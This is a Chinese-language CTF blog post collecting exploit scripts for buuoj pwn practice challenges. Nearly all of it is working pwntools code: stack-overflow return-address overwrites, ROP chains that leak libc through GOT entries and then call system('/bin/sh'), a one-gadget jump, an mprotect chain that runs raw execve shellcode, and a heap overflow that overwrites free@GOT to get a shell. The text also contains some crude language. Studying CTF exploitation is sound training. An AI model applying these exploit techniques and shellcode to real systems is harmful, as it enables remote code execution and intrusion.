---
layout: post
title:  "buuoj-从Pwn到去世"
date:   2019-9-3
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,buuoj,Pwn]
icon: icon-html
---

# buuoj-从Pwn到去世

![11](https://raw.githubusercontent.com/AiDaiP/images/master/pwn/11.png)

* ### 连上就有flag的pwn

  nc [pwn.buuoj.cn](http://pwn.buuoj.cn/) 6000 

* ### RIP覆盖一下

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',6001)
  payload = 'a'*23 + p64(0x0401186)
  r.sendline(payload)
  r.interactive()
  ```

* ### ciscn_2019_c_1

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20115)
  elf = ELF('ciscn_2019_c_1')
  libc = ELF('x64_libc.so.6')
  
  
  puts_plt = elf.plt['puts']
  puts_got = elf.got['puts']
  puts_libc = libc.symbols['puts']
  main = elf.symbols['main']
  system_libc = libc.symbols['system']
  pop_rdi = 0x400c83
  binsh_libc = 0x18cd57
  
  
  payload ='a' * 0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
  r.recvuntil('Input your choice!\n')
  r.sendline('1')
  r.recvuntil('Input your Plaintext to be encrypted\n')
  r.sendline(payload)
  
  r.recvuntil('@\n')
  puts_addr = u64(r.recv(6).ljust(8,'\x00'))
  libc_base = puts_addr - libc.sym['puts']
  
  system = libc_base + system_libc
  binsh = libc_base + binsh_libc
  
  payload ='A'*0x58+p64(pop_rdi)+p64(binsh)+p64(system)
  r.recvuntil('Input your choice!\n')
  r.sendline('1')
  r.recvuntil('Input your Plaintext to be encrypted\n')
  r.sendline(payload)
  
  r.interactive()
  ```

  

* ### warmup_csaw_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20035)
  payload = 'a'*0x48 + p64(0x40060d)
  r.sendline(payload)
  r.interactive()
  ```

  

* ### pwn1_sctf_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20086)
  payload = 'I'*0x14 + p32(0xdeadbeef) + p32(0x08048F0D)
  r.sendline(payload)
  r.interactive()
  ```

* ### ciscn_2019_en_2

  ciscn_2019_c_1

* ### babyheap_0ctf_2017

  略

* ### ciscn_2019_n_1

  wdnmd cat /flag是假的

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20137)
  elf = ELF('./ciscn_2019_n_1')
  libc = ELF('./x64_libc.so.6')
  system = 0x400530
  #flag = 0x4007cc
  p_rdi = 0x400793
  main = 0x4006dc
  one = 0xf1147
  puts_got = elf.got['puts']
  puts_plt = elf.plt['puts']
  puts_libc = libc.symbols['puts']
  #payload = 'a'*0x38 + p64(p_rdi) + p64(flag) + p64(system)
  payload = 'a'*0x38 + p64(p_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)
  r.sendline(payload)
  r.recvuntil('11.28125\n')
  puts = r.recvuntil('\n',drop = True).ljust(8,'\x00')
  puts = u64(puts)
  log.success(hex(puts))
  libc_base = puts - puts_libc
  log,success(hex(libc_base))
  fuck = one + libc_base
  payload = 'a'*0x38 + p64(fuck)
  r.sendline(payload)
  r.interactive()
  ```

  

* ### get_started_3dsctf_2016

  mprotect在bss开一段跑shellcode

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20004)
  elf = ELF('./get_started_3dsctf_2016')
  read_addr = elf.symbols['read']
  mprotect = elf.symbols['mprotect']
  bss_addr = 0x80ebf80
  pop3_ret = 0x804f460
  shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
  payload = 'a'*56
  payload += p32(read_addr)
  payload += p32(pop3_ret)
  payload += p32(0)
  payload += p32(bss_addr)
  payload += p32(0x100)
  payload += p32(mprotect)
  payload += p32(bss_addr)
  payload += p32(0x80eb000)
  payload += p32(0x1000)
  payload += p32(7)
  r.sendline(payload)
  r.sendline(shellcode)
  r.interactive()
  ```

* ### babyfengshui_33c3_2016

  ```c
  struct user {
      char *desc;
      char name[0x7c];
  } user;
  struct user *store[50];
  //0x804b069 user_num
  //0x804b080 store
  ```

  delete时user->desc没有置零，user_num 不变

  有保护措施防止溢出

  ```c
  (store[i]->desc + test_size) < (store[i] - 4)
  ```

  添加两个user，free第一个，然后再添加一个user，description长度为第一个user的description 长度加上user结构体的长度，可以绕过检查，造成堆溢出，修改第二个user的desc指针

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20002)
  elf = ELF('./babyfengshui_33c3_2016')
  libc = ELF('./x86_libc.so.6')
  free_got = elf.got['free']
  free_libc = libc.symbols['free']
  system_libc = libc.symbols['system']
  
  def add_user(size, length, text):
      r.sendlineafter('Action: ', '0')
      r.sendlineafter('description: ', str(size))
      r.sendlineafter('name: ', 'nmsl')
      r.sendlineafter('length: ', str(length))
      r.sendlineafter('text: ', text)
  
  def delete_user(index):
      r.sendlineafter('Action: ', '1')
      r.sendlineafter('index: ', str(index))
   
  def display_user(index):
      r.sendlineafter('Action: ', '2')
      r.sendlineafter('index: ', str(index))
   
  def update(index, length, text):
      r.sendlineafter('Action: ', '3')
      r.sendlineafter('index: ', str(index))
      r.sendlineafter('length: ', str(length))
      r.sendlineafter('text: ', text)
  
  add_user(0x80,0x80,'fuck')
  add_user(0x80,0x80,'fuck')
  add_user(0x8,0x8,'/bin/sh\x00')
  delete_user(0)
  payload = 'a'*0x198 + p32(free_got)
  add_user(0x100,0x19c,payload)
  display_user(1)
  r.recvuntil('description: ')
  free = u32(r.recv(4))
  libc_base = free - free_libc
  system = libc_base + system_libc
  log.success('libc_base {}'.format(hex(libc_base)))
  update(1,0x4,p32(system))
  delete_user(2)
  r.interactive()
  ```

* ### pwn2_sctf_2016

  ```python
  from pwn import *
  r = remote('pwn.buuoj.cn',20087)
  #context.log_level = 'debug'
  elf = ELF('./pwn2_sctf_2016')
  libc = ELF('./x86_libc.so.6')
  printf_plt = elf.plt['printf']
  printf_got = elf.got['printf']
  main = elf.symbols['main']
  printf_libc = libc.symbols['printf']
  system_libc = libc.symbols['system']
  binsh_libc = libc.search('/bin/sh').next()
  r.recvuntil('read?')
  r.sendline('-1')
  payload = 'a'*(0x2c+0x4) + p32(printf_plt) + p32(main) + p32(printf_got)
  r.sendline(payload)
  printf = u32(r.recvuntil('How',drop = True)[-16:-12])
  libc_base = printf - printf_libc
  system = system_libc + libc_base
  binsh = binsh_libc + libc_base
  log.success(hex(libc_base))
  payload = 'a'*(0x2c+0x4) + p32(system)+p32(main)+p32(binsh)
  r.sendline('-1')
  r.sendline(payload)
  r.interactive()
  ```

* ### [OGeek2019]babyrop

  略

* ### [OGeek2019]bookmanager

  略










